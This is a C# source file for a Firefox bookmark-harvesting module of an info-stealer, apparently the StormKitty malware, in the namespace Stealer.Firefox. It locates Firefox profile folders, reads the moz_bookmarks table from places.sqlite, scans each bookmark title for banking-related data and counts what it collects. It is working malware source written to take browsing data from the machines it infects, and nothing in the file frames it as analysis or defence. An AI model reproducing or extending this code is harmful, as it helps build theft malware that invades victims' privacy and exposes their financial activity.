using System;
using System.IO;
using System.Collections.Generic;

namespace Stealer.Firefox
{
    internal class cBookmarks
    {

        // Get cookies.sqlite file location
        private static string GetBookmarksDBPath(string path)
        {
            try
            {
                string dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (string sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\places.sqlite"))
                            return sDir + "\\places.sqlite";
            }
            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to find bookmarks\n" + ex); }
            return null;
        }

        // Get bookmarks from gecko browser
        public static List<Bookmark> Get(string path)
        {
            List<Bookmark> scBookmark = new List<Bookmark>();
            try
            {
                string sCookiePath = GetBookmarksDBPath(path);
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sCookiePath, "moz_bookmarks");
                if (sSQLite == null) return scBookmark;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Bookmark bBookmark = new Bookmark();
                    bBookmark.sTitle = Chromium.Crypto.GetUTF8(sSQLite.GetValue(i, 5));

                    if (Chromium.Crypto.GetUTF8(sSQLite.GetValue(i, 1)).Equals("0") && bBookmark.sTitle != "0")
                    {
                        // Analyze value
                        Banking.ScanData(bBookmark.sTitle);
                        Counter.Bookmarks++;
                        scBookmark.Add(bBookmark);
                    }
                }
            }
            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> bookmarks collection failed\n" + ex); }
            return scBookmark;
        }

    }
}
